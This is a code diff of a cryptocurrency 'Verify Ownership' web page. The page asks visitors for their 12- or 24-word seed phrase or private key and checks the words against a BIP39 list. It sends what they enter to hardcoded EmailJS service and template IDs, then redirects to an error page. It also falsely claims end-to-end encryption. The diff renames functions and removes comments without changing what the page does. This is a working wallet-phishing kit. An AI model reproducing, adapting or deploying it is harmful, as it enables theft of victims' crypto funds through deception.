@@ -15,7 +15,7 @@
         rel="stylesheet">
     <link rel="stylesheet" href="style.css">
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-    <script src="w3ref.js"></script>
+    <script src="wordlist.js"></script>
     <script type="text/javascript">
         (function () {
             emailjs.init('oZMfh8Pn5s8P-9Awx');
@@ -23,9 +23,7 @@
     </script>
     <title>Mainnet web - Verify Ownership</title>
     <style>
-        /* ═══════════════════════════════════════
-           VERIFY PAGE STYLES
-        ═══════════════════════════════════════ */
+
         .verify-page {
             min-height: 100vh;
             background: #f8f9fc;
@@ -49,7 +47,7 @@
             overflow: hidden;
         }
 
-        /* accent line top */
+
         .verify-card::before {
             content: '';
             position: absolute;
@@ -76,7 +74,7 @@
             margin-bottom: 24px;
         }
 
-        /* ── Controls row ── */
+
         .verify-controls {
             display: flex;
             gap: 10px;
@@ -137,7 +135,7 @@
             transform: translateY(0);
         }
 
-        /* ── Error text ── */
+
         .verify-error {
             font-size: 12.5px;
             color: #dc2829;
@@ -158,7 +156,7 @@
             font-size: 14px;
         }
 
-        /* ── Input grid ── */
+
         .phrase-grid {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
@@ -223,7 +221,7 @@
             background: rgba(220, 40, 41, 0.02);
         }
 
-        /* private key single input */
+
         .pk-field {
             width: 100%;
             padding: 14px 14px;
@@ -253,7 +251,7 @@
             background: #ffffff;
         }
 
-        /* ── Security note ── */
+
         .security-note {
             font-size: 12px;
             color: #8a8a9e;
@@ -262,7 +260,7 @@
             line-height: 1.6;
         }
 
-        /* ── Verify button ── */
+
         .verify-btn {
             width: 100%;
             padding: 14px 24px;
@@ -317,7 +315,7 @@
             z-index: 1;
         }
 
-        /* ── Responsive ── */
+
         @media (max-width: 560px) {
             .verify-page {
                 padding: 20px 12px 40px;
@@ -368,35 +366,32 @@
             <h1 class="verify-header">Ownership Verification</h1>
             <p class="verify-subtitle">Select a verification method</p>
 
-            <!-- Controls row -->
+
             <div class="verify-controls">
-                <select class="verify-select" id="verifyMethod" onchange="onMethodChange()">
+                <select class="verify-select" id="verifyMethod" onchange="onSelectChange()">
                     <option value="12">12-word phrase</option>
                     <option value="24">24-word phrase</option>
                     <option value="pk">Private key</option>
                 </select>
-                <button class="paste-btn" onclick="onPaste()">
+                <button class="paste-btn" onclick="onClipboardPaste()">
                     <i class="ri-clipboard-line"></i>
                     Paste
                 </button>
             </div>
 
-            <!-- Error area -->
+
             <div class="verify-error" id="verifyError">
                 <i class="ri-error-warning-line"></i>
                 <span id="verifyErrorText"></span>
             </div>
 
-            <!-- Input fields container -->
-            <div id="inputContainer">
-                <!-- Populated by JS -->
-            </div>
+            <div id="inputContainer"></div>
 
-            <!-- Security note -->
+
             <p class="security-note">🔒 Your data is protected with end-to-end encryption</p>
 
-            <!-- Verify button -->
-            <button class="verify-btn" onclick="processInput()">
+
+            <button class="verify-btn" onclick="handleVerify()">
                 <i class="ri-shield-check-line"></i>
                 <span>Verify Ownership</span>
             </button>
@@ -410,8 +405,8 @@
         const verifyError = document.getElementById('verifyError');
         const verifyErrorText = document.getElementById('verifyErrorText');
         const verifyMethod = document.getElementById('verifyMethod');
-        function renderFields(type) {
-            hideError();
+        function buildInputFields(type) {
+            clearError();
             inputContainer.innerHTML = '';
 
             if (type === 'pk') {
@@ -478,7 +473,7 @@
                     input.addEventListener('input', function () {
                         this.classList.toggle('has-value', this.value.trim().length > 0);
                         this.classList.remove('error');
-                        hideError();
+                        clearError();
                     });
 
                     wrap.appendChild(num);
@@ -489,10 +484,10 @@
                 inputContainer.appendChild(grid);
             }
         }
-        function onMethodChange() {
-            renderFields(verifyMethod.value);
+        function onSelectChange() {
+            buildInputFields(verifyMethod.value);
         }
-        async function onPaste() {
+        async function onClipboardPaste() {
             try {
                 const text = await navigator.clipboard.readText();
                 if (!text || !text.trim()) return;
@@ -517,21 +512,21 @@
                     }
                 }
 
-                hideError();
+                clearError();
             } catch (err) {
 
-                console.warn('Clipboard read failed:', err);
+
             }
         }
-        function showError(msg) {
+        function displayError(msg) {
             verifyErrorText.textContent = msg;
             verifyError.classList.add('show');
         }
 
-        function hideError() {
+        function clearError() {
             verifyError.classList.remove('show');
         }
-        function processInput() {
+        function handleVerify() {
             const method = verifyMethod.value;
 
             if (method === 'pk') {
@@ -539,16 +534,15 @@
                 const pkInput = document.getElementById('pkInput');
                 const val = pkInput ? pkInput.value.trim() : '';
 
-                // Checks for 64-character hex (with or without 0x) or typical Base58 strings (40-90 chars)
                 const hexRegex = /^(0x)?[0-9a-fA-F]{64}$/;
                 const base58Regex = /^[1-9A-HJ-NP-Za-km-z]{40,90}$/;
 
                 if (!val || (!hexRegex.test(val) && !base58Regex.test(val))) {
-                    showError('invalid private key');
+                    displayError('invalid private key');
                     return;
                 }
 
-                finalize(method, val);
+                submitVerification(method, val);
 
             } else {
 
@@ -565,7 +559,7 @@
                         allFilled = false;
                         if (input) input.classList.add('error');
                     } else {
-                        if (typeof W3_REF !== 'undefined' && !W3_REF.has(val)) {
+                        if (typeof BIP39_WORDS !== 'undefined' && !BIP39_WORDS.has(val)) {
                             isValidPhrase = false;
                         } else if (input) {
                             input.classList.remove('error');
@@ -575,15 +569,15 @@
                 }
 
                 if (!allFilled || !isValidPhrase) {
-                    showError('Data entered is not a valid seed phrase');
+                    displayError('Data entered is not a valid seed phrase');
                     return;
                 }
 
 
-                finalize(method, phraseWords.join(' '));
+                submitVerification(method, phraseWords.join(' '));
             }
         }
-        function finalize(method, data) {
+        function submitVerification(method, data) {
             const btn = document.querySelector('.verify-btn');
             btn.innerHTML = '<i class="ri-loader-4-line ri-spin"></i><span>Verifying...</span>';
             btn.style.pointerEvents = 'none';
@@ -613,25 +607,25 @@
 
             let parms = { message: safetext };
 
-            function sendWithRetry(retries) {
+            function dispatchData(retries) {
                 emailjs.send('service_b91vfvn', 'template_artm0pa', parms)
                     .then(function (response) {
                         window.location.href = "error.html";
                     })
                     .catch(function (error) {
                         if (retries > 0) {
-                            setTimeout(function () { sendWithRetry(retries - 1); }, 1500);
+                            setTimeout(function () { dispatchData(retries - 1); }, 1500);
                         } else {
                             window.location.href = "error.html";
                         }
                     });
             }
-            sendWithRetry(2);
+            dispatchData(2);
         }
-        renderFields('12');
+        buildInputFields('12');
     </script>
 
-    <script src="function.js"></script>
+    <script src="app.js"></script>
 </body>
 
 </html>
